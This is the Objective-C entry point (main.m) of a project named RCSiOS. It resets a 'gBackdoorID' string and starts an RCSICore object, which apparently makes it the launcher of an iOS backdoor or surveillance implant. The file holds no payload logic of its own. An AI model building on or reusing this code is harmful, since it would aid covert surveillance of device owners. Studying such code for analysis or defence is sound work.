/*
 * RCSiOS
 *  pon pon
 *
 * Created on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#import "RCSICore.h"
#import "RCSIConfManager.h"
#import "RCSICommon.h"
#import "RCSITaskManager.h"
#import "RCSILogger.h"
#import "RCSIDebug.h"


int main (int argc, const char * argv[])
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // FIXED- fixing string binary patched
  gBackdoorID[14] = gBackdoorID[15] = 0;
    
  RCSICore *core = [[RCSICore alloc] init];

  [core runMeh];
  
  [pool release];
  [core release];
  return 0;
}
